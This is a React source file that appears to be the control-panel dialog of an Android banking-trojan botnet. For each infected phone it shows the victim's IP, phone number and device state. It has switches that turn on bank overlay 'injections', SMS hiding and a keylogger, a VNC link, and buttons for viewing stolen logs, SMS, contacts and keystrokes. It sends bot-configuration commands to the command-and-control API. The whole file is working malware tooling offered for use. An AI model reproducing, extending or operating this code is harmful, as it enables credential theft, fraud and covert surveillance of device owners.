import React, { useState, useEffect, useRef } from 'react'
import SettingsContext from 'src/settings';
import NextLink from 'next/link';
import { Dialog, Box, Switch, Tooltip, DialogTitle, SvgIcon, DialogContent, Typography, Button, Grid, Item, Paper, List, ListItem, ListItemIcon, ListItemText} from '@mui/material';
import XCircleIcon from '@heroicons/react/24/solid/XCircleIcon';
import UserIcon from '@heroicons/react/24/solid/UserCircleIcon';
import Globe from '@heroicons/react/24/solid/GlobeEuropeAfricaIcon';
import Battery from '@heroicons/react/24/solid/Battery100Icon';
import { func } from 'prop-types';
import axios from "axios";
import $ from 'jquery';
import { Svg } from "react-svg";
import LogsPopup from './logsPopup';
import AppsPopup from './appspopup';
import SmsPopup from './smspopup';
import ContactPopup from './contactpopup';
import EventPopup from './eventpopup';
import KeyloggerPopup from './keyloggerpopup';
import Link from 'next/link';

import DownloadCloudSlash from 'src/icons/download-cloud-slash';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faWifi, faXmarkSquare, faMobile, faUser, faUserAltSlash, faClockRotateLeft, faCommentSlash, faKeyboard, faKey, faBug, faB, faEye, faEyeSlash, faUniversalAccess, faCommentSms, faBugSlash, faCalendarDays, faSms, faAddressBook, faMobileAndroid, faMobileScreen, faMobileAlt, faMobileAndroidAlt, faGlobe, faCopyright, faSquareXmark, faMobileScreenButton, faDownload, faCloudDownload, faFolderOpen } from '@fortawesome/free-solid-svg-icons';
import countryData from './countrydata.json';
import { checkperms } from 'src/utils/checkperms';
import FolderOpenSlash from 'src/icons/folder-open-slash';


export default function Popup(props) {

    // Nextauth

    const { customer, title, children, openPopup, setOpenPopup, onClose} = props;
    const [data, setData] = useState([]);
    const [banks, setBanks] = useState([]);
    const [activebanks, setActivebanks] = useState([]);
    const [hidesms, setHidesms] = useState(0);
    const [keylogger, setKeylogger] = useState(0);
    const [vnc, setVnc] = useState(0);
    const [lockDevice, setlockDevice] = useState(0);
    const [offSound, setOffsound] = useState(0)
    const countRef = useRef(0);

    const [apprequest, setapprequest] = useState(false);
    const [openAppsPopup, setOpenAppsPopup] = useState(false);

    const [openLogsPopup, setOpenLogsPopup] = useState(false);

    const [smsrequest, setsmsrequest] = useState(false)
    const [openSmsPopup, setOpenSmsPopup] = useState(false);

    const [contactrequest, setcontactrequest] = useState(false)
    const [opencontactPopup, setOpenContactPopup] = useState(false)

    const [eventrequest, seteventrequest] = useState(false)
    const [openeventPopup, setOpenEventPopup] = useState(false)


    const [keyloggerrequest, setkeyloggerrequest] = useState(false)
    const [openkeyloggerPopup, setOpenKeyloggerPopup] = useState(false)
    
    const [selectedId, setSelectedId] = useState(null);


    const rootStyle = {
        display: 'flex',
        flexDirection: 'column',
        padding: '25px',
      };
    
      const smallBoxStyle = {
        marginBottom: '25px'
      };
    
      const tworoundstyle = {
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
      };
    
      
    
    const openlogsdialog = (id, index) => {
    setSelectedId(id);
    setOpenLogsPopup(true);
    }

    const handleLogsPopupClose = () => {
    setSelectedId(null);
    setOpenLogsPopup(false);
    };

    const openAppsdialog = (id, index) => {
        setSelectedId(id);
        setOpenAppsPopup(true);
    }

    const handleAppsPopupClose = () => {
        setSelectedId(null);
        setOpenAppsPopup(false);
    };

    const openSmsdialog = (id, index) => {
        setSelectedId(id);
        setOpenSmsPopup(true);
    }

    const handleSmsPopupClose = () => {
        setSelectedId(null);
        setOpenSmsPopup(false);
    };

    const openContactdialog = (id, index) => {
        setSelectedId(id);
        setOpenContactPopup(true);
    }

    const handleContactPopupClose = () => {
        setSelectedId(null);
        setOpenContactPopup(false);
    };

    const openEventdialog = (id, index) => {
        setSelectedId(id);
        setOpenEventPopup(true);
    }

    const handleEventPopupClose = () => {
        setSelectedId(null);
        setOpenEventPopup(false);
    };

    const openKeyloggerdialog = (id, index) => {
        setSelectedId(id);
        setOpenKeyloggerPopup(true);
    }

    const handleKeyloggerPopupClose = () => {
        setSelectedId(null);
        setOpenKeyloggerPopup(false);
    };



    function getCountryName(code) {
    const uppercaseCode = code.toUpperCase();
    const country = countryData.find(c => c.abbreviation === uppercaseCode);
    return country ? country.country : null;
    }

    function checkInjectionEnabeld(injection) {
        return activebanks.includes(injection);
    }

    function formatTime(time) {
        let formattedTime = "";
        if (time < 60) {
          formattedTime = `${time} second${time === 1 ? "" : "s"}`;
        } else if (time < 3600) {
          const minutes = Math.floor(time / 60);
          formattedTime = `${minutes} minute${minutes === 1 ? "" : "s"}`;
        } else if (time < 86400) {
          const hours = Math.floor(time / 3600);
          formattedTime = `${hours} hour${hours === 1 ? "" : "s"}`;
        } else {
          const days = Math.floor(time / 86400);
          formattedTime = `${days} day${days === 1 ? "" : "s"}`;
        }
        return formattedTime;
    }

    const switchactivebank = (bank) => (event) => {
        if (event.target.checked) {
            var newarray = activebanks;
            newarray.push(bank);
            setActivebanks(newarray)
            SaveSettings(keylogger, hidesms);
        } else {
            var newarray = activebanks;
            const index = newarray.indexOf(bank);
            newarray = newarray.splice(index, 1)
            setActivebanks(newarray)
            SaveSettings(keylogger, hidesms);
        }
    };

    const switchhidesms = (event) => {
        if (event.target.checked) {
            setHidesms(1);
            SaveSettings(keylogger, 1, vnc);
        } else if (!event.target.checked) {
            setHidesms(0);
            SaveSettings(keylogger, 0, vnc);
        }
    };

    const switchkeylogger = (event) => {
        if (event.target.checked) {
            setKeylogger(1)
            SaveSettings(1, hidesms, vnc);
        } else if (!event.target.checked) {
            setKeylogger(0)
            SaveSettings(0, hidesms, vnc);
        }
    };

    const switchvnc = (event) => {
        if (event.target.checked) {
            setVnc(1)
            SaveSettings(keylogger, hidesms, 1);
        } else if (!event.target.checked) {
            setVnc(0)
            SaveSettings(keylogger, hidesms, 0);
        }
    };

    function SaveSettings(keylogger, hidesms, vnc) {
        const activeinj = ["null", ...activebanks].join(":");
        
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer(
                    '{"' + 
                    'request":"editBotSettings",' + 
                    '"idbot":"' + customer.id + '",' + 
                    '"hideSMS":"' + hidesms + '",' + 
                    '"lockDevice":"' + lockDevice + '",' + 
                    '"offSound":"' + offSound + '",' + 
                    '"keylogger":"' + keylogger + '",' + 
                    '"activeInjection":"' + activeinj + '",' + 
                    '"password":"' + SettingsContext.password + ' "}').toString('base64')
            }
        });
    }

    useEffect(() => {
            
        if (openPopup) {
                async function fetchData() {
                    var dataparams = ""
                    dataparams = "params=" + new Buffer('{"request":"getBotsFull","idbot":"' + customer.id + '","password":"' + SettingsContext.password + ' "}').toString('base64')
                    var response = await axios.post(SettingsContext.restApiUrl, dataparams);
                    setData(response.data);
        
                    try {
                    dataparams = "params=" + new Buffer('{"request":"getBotSettings","idbot":"' + customer.id + '","password":"' + SettingsContext.password + ' "}').toString('base64')
                    response = await axios.post(SettingsContext.restApiUrl, dataparams);

                    if (response.data.banks != null) {
                        var responsedataBanks = response.data.banks.split(":");
                        var filteredList = responsedataBanks.filter(item => item !== '');
                        setBanks(filteredList);
                    }

                    setKeylogger(Number(response.data.keylogger))
                    setHidesms(Number(response.data.hideSMS))
                    
        
                    var responsedataBanksActive = response.data.activeInjection.slice(4).split(":");
                    var filteredList = responsedataBanksActive.filter(item => item !== '');
                    setActivebanks(filteredList);
                    }
                    catch (error) {
                    //console.log(error)
                    }
            
            }
            fetchData();

            const interval = setInterval(() => {
                countRef.current++;
                fetchData()
              }, 10000);
          
              return () => clearInterval(interval);
        }

      }, [openPopup]);
        

    return (
        
        <Dialog open={openPopup} onClose={() => setOpenPopup(false)} maxWidth="md" >
            <DialogContent dividers>
                    <div style={{ display: "flex", justifyContent: "space-between"}}>
                <Box
                    bgcolor="primary.main"
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    marginRight={2}
                    alignItems="center"
                    display="flex"
                    height={45}
                    width={220}
                >
                    <SvgIcon fontSize="medium">
                          <UserIcon width={20} height={23}/> 
                        </SvgIcon>
                        <Typography ml={0.5}>{customer.id}</Typography>
                        
                </Box>
                <Box
                    bgcolor="primary.main"
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    marginRight={2}
                    alignItems="center"
                    display="flex"
                    height={45}
                >
                        <Typography><img src={`/assets/flag/${customer.country}.png`}></img></Typography><Typography ml={0.5}>{getCountryName(customer.country)}</Typography>
                        
                </Box>
                <Box
                    bgcolor="primary.main"
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    marginRight={2}
                    alignItems="center"
                    display="flex"
                    height={45}
                >
                    <SvgIcon fontSize="medium">
                          <Battery width={20} height={23}/> 
                        </SvgIcon>
                        <Typography ml={0.5}>{data.batteryLevel}%</Typography>
                        
                </Box>


                <Box
                    bgcolor="primary.main"
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    alignItems="center"
                    display="flex"
                    height={45}
                    width={150}
                >
                    <SvgIcon fontSize="medium">
                        <FontAwesomeIcon icon={faClockRotateLeft} width={20} height={23} />
                    </SvgIcon>
                        <Typography ml={0.5}>{formatTime(data.lastConnect)}</Typography>
                        
                </Box>
                <Button
                sx={{
                    width: "45px",
                    height: 45,
                    minWidth: 0,
                    padding: 0,
                    borderRadius: '0%',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center'
                }}
                onClick={()=> setOpenPopup(false)}
                >
                <FontAwesomeIcon icon={faSquareXmark} style={{ width: '100%', height: '100%' }} />
                </Button>
                </div>
         

            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", height: '450px' }}>
                <Box
                    style={rootStyle}
                    bgcolor="primary.main"
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    flexDirection="collumn"
                    justifyContent='space-between'
                    alignItems="center"
                    display="flex"
                    height={400}
                    width={220}
                >
                    <Box
                    style={smallBoxStyle}
                    bgcolor="#ffffff"
                    color="#000000"
                    p={2}
                    borderRadius={1}
                    alignItems="center"
                    display="flex"
                    height={50}
                    width={180}
                >
                                            <SvgIcon fontSize="medium">
                          <Globe width={20} height={23}/> 
                        </SvgIcon>
                        <Typography ml={0.5} noWrap>{data.operator}</Typography>
                        
                    </Box>      
                    <Box
                    style={smallBoxStyle}
                    bgcolor="#ffffff"
                    color="#000000"
                    p={2}
                    borderRadius={1}
                    alignItems="center"
                    display="flex"
                    height={50}
                    width={180}
                >
                    <SvgIcon fontSize="medium">
                    <FontAwesomeIcon icon={faWifi} width={20} height={23} />
                        </SvgIcon>
                        <Typography ml={0.5}>{data.ip}</Typography>
                        
                    </Box>       

                    <Box
                    style={smallBoxStyle}
                    bgcolor="#ffffff"
                    color="#000000"
                    p={2}
                    borderRadius={1}
                    alignItems="center"
                    display="flex"
                    height={50}
                    width={180}
                >
                    <SvgIcon fontSize="medium">
                    <FontAwesomeIcon icon={faMobile} width={20} height={23} />
                        </SvgIcon>
                        <Typography ml={0.5} noWrap>{data.phoneNumber}</Typography>
                        
                    </Box> 

                    <Tooltip title={data.model} arrow>
                    <Box
                    style={smallBoxStyle}
                    bgcolor="#ffffff"
                    color="#000000"
                    p={2}
                    borderRadius={1}
                    alignItems="center"
                    display="flex"
                    height={50}
                    width={180}
                >
                    <SvgIcon fontSize="medium">
                    <FontAwesomeIcon icon={faCopyright} width={20} height={23} />
                        </SvgIcon>
                        
                        <Typography ml={0.5} noWrap>{data.model}</Typography>   
                    </Box>
                    </Tooltip>
                    <Box
                    style={smallBoxStyle}
                    bgcolor="#ffffff"
                    color="#000000"
                    p={2}
                    borderRadius={1}
                    alignItems="center"
                    display="flex"
                    height={50}
                    width={180}
                >
                        <svg height="" viewBox="0,0,264.583,230.948" width="30" xmlns="http://www.w3.org/2000/svg">
 <metadata/>
 <g transform="translate(-66.97 -261.92)">
  <g transform="matrix(1.32125 0 0 1.32125 480.53 -75.04)">
   <path d="m-299.036 399.581c-6.88566 0-13.966 5.51768-13.966 15.1756 0 8.82926 6.22524 15.0656 13.966 15.0656 6.38958 0 9.23732-4.28876 9.23732-4.28876v1.86946c0 .8836.83542 1.86946 1.86946 1.86946h4.61866v-29.0316h-6.48812v3.68394s-2.8716-4.34376-9.23732-4.34376zm1.15574 5.93636c5.66836 0 8.64172 4.9851 8.64172 9.2371 0 4.73604-3.5303 9.23388-8.6297 9.2339-4.26278 0-8.53284-3.45238-8.53284-9.2964 0-5.27526 3.67466-9.1746 8.52082-9.1746z"/>
   <path d="m-274.293 429.272c-.99682 0-1.86946-.71498-1.86946-1.86946v-27.1621h6.48812v3.59262c1.47022-2.20986 4.34254-4.26128 8.75132-4.26128 7.2059 0 11.043 5.74422 11.043 11.1156v18.5846h-4.5087c-1.18224 0-1.97942-.9897-1.97942-1.97942v-15.1756c0-2.97738-1.82422-6.59332-6.04314-6.59332-4.55234 0-7.26302 4.30228-7.26302 8.3528v15.3955z"/>
   <path d="m-230.966 399.581c-6.88564 0-13.9659 5.51768-13.9659 15.1756 0 8.82926 6.22524 15.0656 13.9659 15.0656 6.38958 0 9.23734-4.28876 9.23734-4.28876v1.86946c0 .8836.83542 1.86946 1.86946 1.86946h4.61866v-43.5474h-6.48812v18.1997s-2.87162-4.34374-9.23734-4.34374zm1.15576 5.93636c5.66836 0 8.64172 4.9851 8.64172 9.2371 0 4.73604-3.53032 9.23388-8.6297 9.2339-4.26278 0-8.53284-3.45238-8.53284-9.2964 0-5.27528 3.67464-9.1746 8.52082-9.1746z"/>
   <path d="m-206.223 429.272c-.99682 0-1.86946-.71498-1.86946-1.86946v-27.1621h6.48812v4.8386c1.11676-2.7106 3.52662-5.1685 7.80774-5.1685 1.19346 0 2.30934.21994 2.30934.21994v6.70804s-1.39338-.54984-3.07912-.54984c-4.55234 0-7.03796 4.30228-7.03796 8.35282v14.6305z"/>
   <path d="m-152.119 429.272c-.99682 0-1.86946-.71498-1.86946-1.86946v-27.1621h6.48812v29.0316z"/>
   <path d="m-128.476 399.581c-6.88566 0-13.966 5.51768-13.966 15.1756 0 8.82926 6.22524 15.0656 13.966 15.0656 6.38956 0 9.23731-4.28876 9.23731-4.28876v1.86946c0 .8836.83542 1.86946 1.86946 1.86946h4.61866v-43.5474h-6.48812v18.1997s-2.87159-4.34374-9.23731-4.34374zm1.15574 5.93636c5.66836 0 8.64171 4.9851 8.64171 9.2371 0 4.73604-3.53029 9.23388-8.62969 9.2339-4.26278 0-8.53284-3.45238-8.53284-9.2964 0-5.27528 3.67466-9.1746 8.52082-9.1746z"/>
   <circle cx="-150.79" cy="389.69" r="4.29"/>
   <path d="m-174.376 399.571c-7.21114 0-15.1337 5.38276-15.1337 15.1337 0 8.88566 6.74818 15.1183 15.118 15.1183 10.315 0 15.3517-8.29218 15.3517-15.062 0-8.30724-6.48568-15.19-15.336-15.19zm.0236 6.059c4.9867 0 8.70638 4.01914 8.70638 9.09298 0 5.16184-3.94862 9.14498-8.69156 9.14498-4.40284 0-8.68276-3.583-8.68276-9.0582 0-5.56646 4.07064-9.17976 8.66794-9.17976z"/>
  </g>
  <path d="m263.837 306.59 21.9331-37.9944c1.2377-2.12998.48933-4.83565-1.61189-6.07335-2.1012-1.23768-4.83565-.5181-6.04456 1.61189l-22.221 38.4837c-16.9536-7.74281-36.0371-12.0604-56.5599-12.0604-20.5227 0-39.6063 4.31754-56.5599 12.0604l-22.221-38.4837c-1.2377-2.12999-3.94336-2.84957-6.07335-1.61189-2.13 1.2377-2.84959 3.94337-1.61189 6.07335l21.9331 37.9944c-37.8217 20.494-63.4392 58.7762-67.6703 103.592h264.407c-4.2312-44.8161-29.8487-83.0984-67.6991-103.592zm-125.209 66.4614c-6.13092 0-11.0817-4.97957-11.0817-11.0817 0-6.13093 4.97957-11.0817 11.0817-11.0817 6.13092 0 11.0817 4.97956 11.0817 11.0817.0289 6.10212-4.95079 11.0817-11.0817 11.0817zm121.381 0c-6.13091 0-11.0817-4.97957-11.0817-11.0817 0-6.13093 4.97958-11.0817 11.0817-11.0817 6.13093 0 11.0817 4.97956 11.0817 11.0817.0288 6.10212-4.95077 11.0817-11.0817 11.0817z" fill="#32de84" stroke-width=".288"/>
 </g>
</svg><Typography ml={1} noWrap>Android {data.version}</Typography>
                        
                    </Box>

                </Box>    
                

        
                <Grid container direction={'column'} marginLeft={2}>
                <Grid container spacing={5} justifyItems="center" justifyContent="center">
                    <Grid item>
                        <Tooltip title="Indicates if user looks at screen">
                            <Box bgcolor="primary.main" color="primary.contrastText" borderRadius="50%" height={50} width={50} display="flex" alignItems="center" justifyContent="center">
                                { data.statScreen === "1" ? (
                                    <FontAwesomeIcon size="2x" icon={faEye}/>
                                    
                                ) : (
                                    <FontAwesomeIcon size="2x" icon={faEyeSlash}/>
                                )}
                            </Box>
                        </Tooltip>
                    </Grid>
                    <Grid item>
                        <Tooltip title="Indicates if storage access is enabled">
                            <Box bgcolor="primary.main" color="primary.contrastText" borderRadius="50%" overflow={"hidden"} height={50} width={50} display="flex" alignItems="center" justifyContent="center">
                                { data.statExternal === "1" ? (
                                    <FontAwesomeIcon size="2x" icon={faFolderOpen}/>
                                    
                                ) : (
                                    <FolderOpenSlash/>
                                )}
                            </Box>
                        </Tooltip>
                    </Grid>
                    <Grid item>
                        <Tooltip title="Indicates if sms interception is enabled">
                            <Box bgcolor="primary.main" color="primary.contrastText" borderRadius="50%" height={50} width={50} display="flex" alignItems="center" justifyContent="center">
                                { data.statSMS === "1" ? (
                                    <FontAwesomeIcon size="2x" icon={faCommentSms}/>
                                    
                                ) : (
                                    <FontAwesomeIcon size="2x" icon={faCommentSlash}/>
                                )}
                            </Box>
                        </Tooltip> 
                    </Grid>
                    <Grid item>
                        <Tooltip title="Indicates if the app can install other apks">
                            <Box bgcolor="primary.main" color="primary.contrastText" borderRadius="50%" overflow={"hidden"} height={50} width={50} display="flex" alignItems="center" justifyContent="center">
                                { data.statUnknownInstall === "1" ? (
                                    <FontAwesomeIcon size="2x" icon={faCloudDownload}/>
                                    
                                ) : ( 

                                    <DownloadCloudSlash/>
                                    
                                )}
                            </Box>
                        </Tooltip> 
                    </Grid>
                    <Grid item>
                        <Tooltip title="Indicates if admin access is enabled">
                            <Box bgcolor="primary.main" color="primary.contrastText" borderRadius="50%" height={50} width={50} display="flex" alignItems="center" justifyContent="center">
                                { data.statAdmin === "1" ? (
                                    <FontAwesomeIcon size="2x" icon={faUser}/>
                                    
                                ) : (
                                    <FontAwesomeIcon size="2x" icon={faUserAltSlash}/>
                                )}
                            </Box>
                        </Tooltip> 
                    </Grid>
                </Grid>


                <Box bgcolor="primary.main" color="#ffffff" marginTop={2} borderRadius={1} sx={{ height: 335, width: 495, overflow: "auto"}}>
                    <Typography ml={3} marginTop={2} align='left' variant="h4">                    
                    <SvgIcon fontSize="medium">
                        <FontAwesomeIcon icon={faBug} size="2x"/>
                    </SvgIcon>   Injections</Typography>
                    <List>
                        {banks.map((bank, index) => (
                        <ListItem key={index}>
                            <ListItemIcon>
                            <Switch defaultChecked={activebanks.includes(bank)} color="default" disabled={!checkperms(7)} onChange={switchactivebank(bank)} />
                            </ListItemIcon>
                            <ListItemText primary={bank} />
                        </ListItem>
                        ))}
                    </List>
                </Box>

                </Grid>

            </div>

            <Box
                    bgcolor="primary.main"
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    alignItems="center"
                    display="flex"
                    height={80}
                >
                    <Tooltip title="Remember that on some android versions the SMS will be hidden automatically once interception is triggered">
                        <Box flexGrow={1} alignItems="center" display="flex">
                            <SvgIcon fontSize="large">
                                <FontAwesomeIcon icon={faCommentSlash} size="5x"/>
                            </SvgIcon>
                            <Typography ml={1} variant='h4' flexGrow={0}>HideSMS</Typography><Switch defaultChecked={hidesms === 1} onChange={switchhidesms} disabled={!checkperms(7)} color='info'/>
                        </Box>
                    </Tooltip>
                    

                    <Tooltip title="This enabled the keylogger">
                        <Box flexGrow={1} ml={0} alignItems="center" display="flex">
                        <SvgIcon fontSize="large">
                            <FontAwesomeIcon icon={faKeyboard} size="5x"/>
                        </SvgIcon>
                        <Typography ml={1} variant='h4'>Keylogger</Typography><Switch defaultChecked={keylogger === 1} onChange={switchkeylogger} disabled={!checkperms(7)} color='info'/>
                        </Box>
                    </Tooltip>

                    <Tooltip title="Click here to jump to the vnc">
                        <Box flexGrow={1} ml={0} alignItems="center" display="flex" >
                        <SvgIcon fontSize="large">
                            <FontAwesomeIcon color='#643a1c' icon={faMobileScreenButton} size="5x"/>
                        </SvgIcon>
                        <Link href={`/vnc/${customer.id}`} style={{ textDecoration: 'none'}}><Typography color="primary.contrastText" ml={0.5} variant='h4'>VNC</Typography></Link>
                        </Box>
                    </Tooltip>                    
                    
                        
                </Box>

                <Box
                    bgcolor="primary.main"
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    mt={3}
                    alignItems="center"
                    display="flex"
                    height={160}
                    maxWidth={730}
                >
                        <Grid container spacing={2} ml={4} justify="center" alignItems="center">
                            <Grid item xs={4}>
                                <Button onClick={() => openlogsdialog(customer.id)} style={{width: '150px', height: '50px', backgroundColor: 'white', color: 'black'  }} startIcon={(<FontAwesomeIcon icon={faKey} />)}variant="contained">LOGS</Button>
                                <LogsPopup
                                customer={customer}
                                openPopup={selectedId === customer.id && openLogsPopup}
                                idbot={customer.id}
                                setOpenPopup={setOpenLogsPopup}
                                onClose={handleLogsPopupClose}>
                                </LogsPopup>
                            </Grid>
                            <Grid item xs={4}>
                                <Button onClick={() => openEventdialog(customer.id)} style={{width: '150px', height: '50px', backgroundColor: 'white', color: 'black'  }} startIcon={(<FontAwesomeIcon icon={faCalendarDays} />)}variant="contained">EVENTS</Button>
                                <EventPopup
                                customer={customer}
                                openPopup={selectedId === customer.id && openeventPopup}
                                idbot={customer.id}
                                setOpenPopup={setOpenEventPopup}
                                onClose={handleEventPopupClose}
                                eventrequest={eventrequest}
                                seteventrequest={seteventrequest}>
                                </EventPopup>
                            </Grid>
                            <Grid item xs={4}>
                                <Button onClick={() => openContactdialog(customer.id)} style={{width: '150px', height: '50px', backgroundColor: 'white', color: 'black'  }} startIcon={(<FontAwesomeIcon icon={faAddressBook} />)}variant="contained">CONTACTS</Button>
                                <ContactPopup
                                customer={customer}
                                openPopup={selectedId === customer.id && opencontactPopup}
                                idbot={customer.id}
                                setOpenPopup={setOpenContactPopup}
                                onClose={handleContactPopupClose}
                                contactrequest={contactrequest}
                                setcontactrequest={setcontactrequest}>
                                </ContactPopup>
                            </Grid>
                            <Grid item xs={4}>
                                <Button onClick={() => openSmsdialog(customer.id)} style={{width: '150px', height: '50px', backgroundColor: 'white', color: 'black' }} startIcon={(<FontAwesomeIcon icon={faSms} />)}variant="contained">SMS</Button>
                                <SmsPopup
                                customer={customer}
                                openPopup={selectedId === customer.id && openSmsPopup}
                                idbot={customer.id}
                                setOpenPopup={setOpenSmsPopup}
                                onClose={handleSmsPopupClose}
                                smsrequest={smsrequest}
                                setsmsrequest={setsmsrequest}>
                                </SmsPopup>
                            </Grid>
                            <Grid item xs={4}>
                                <Button onClick={() => openAppsdialog(customer.id)} style={{width: '150px', height: '50px', backgroundColor: 'white', color: 'black'  }} startIcon={(<FontAwesomeIcon icon={faMobileAndroid} />)}variant="contained">APPS</Button>
                                <AppsPopup
                                customer={customer}
                                openPopup={selectedId === customer.id && openAppsPopup}
                                idbot={customer.id}
                                setOpenPopup={setOpenAppsPopup}
                                onClose={handleAppsPopupClose}
                                apprequest={apprequest}
                                setapprequest={setapprequest}>
                                </AppsPopup>
                            </Grid>
                            <Grid item xs={4}>
                                <Button disabled={!checkperms(6)} onClick={() => openKeyloggerdialog(customer.id)} style={{width: '150px', height: '50px', backgroundColor: 'white', color: 'black'  }} startIcon={(<FontAwesomeIcon icon={faKeyboard} />)}variant="contained">KEYLOGGER</Button>
                                <KeyloggerPopup
                                customer={customer}
                                openPopup={selectedId === customer.id && openkeyloggerPopup}
                                idbot={customer.id}
                                setOpenPopup={setOpenKeyloggerPopup}
                                onClose={handleKeyloggerPopupClose}
                                keyloggerrequest={keyloggerrequest}
                                setkeyloggerrequest={setkeyloggerrequest}>
                                </KeyloggerPopup>
                            </Grid>
                        </Grid>
                </Box>

            </DialogContent>
        </Dialog>
    )
}
